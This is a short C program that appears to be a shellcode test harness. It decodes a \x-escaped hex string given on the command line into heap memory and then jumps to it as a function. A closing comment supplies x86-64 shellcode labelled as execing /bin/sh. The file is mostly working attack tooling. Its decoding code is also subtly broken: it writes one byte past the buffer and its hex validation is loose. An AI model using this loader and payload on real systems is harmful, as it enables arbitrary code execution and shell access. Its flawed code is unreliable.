#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

#define ERR(x) ( fprintf(stderr, "%s\n", x) )
#define UNUSED(x) ( (void)(x) )

#define uint unsigned int

char *
convert_fromescape_hex(const char *original_str) {
    if(original_str == NULL) {
        ERR("Original string must not be NULL");
        return NULL;
    }

    uint str_length = ((uint)strlen(original_str) / 3) + 1;
    char num[3] = "\x00\x00\x00";

    char *new_str = (char *)malloc(str_length);
    if(new_str == NULL) {
        ERR("Not enough memory!");
        return NULL;
    }
  
    new_str[str_length] = 0x0;

    for(uint i = 0; i < str_length; i++) {
        memcpy(num, (original_str + (i * 3) + 1), 2);

        for(uint j = 0; j < 2; j++) {
            if((num[j] < 48 || num[j] > 57)
                && (num[j] < 65 || num[j] > 90)
                && (num[j] < 97 || num[j] > 122)) {
                    ERR("Invalid hex character detected");
                    return NULL;
            }
        }

        new_str[i] = (char)strtol(num, NULL, 16);
    }

    return new_str;
}

int 
main(const int argc, const char *argv[], char *envp[]) {
    UNUSED(envp);

    if(argc != 2) {
        printf("USAGE: %s <SHELLCODE>\n", argv[0]);
        return 0;
    }

    char *shellcode = convert_fromescape_hex(argv[1]);
    if(shellcode == NULL)
        return 1;

    void(* func)() = (void(*)())shellcode;
    (void)func();

    free(shellcode);
    
    return 0;
}

// exec bin/sh
// \x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
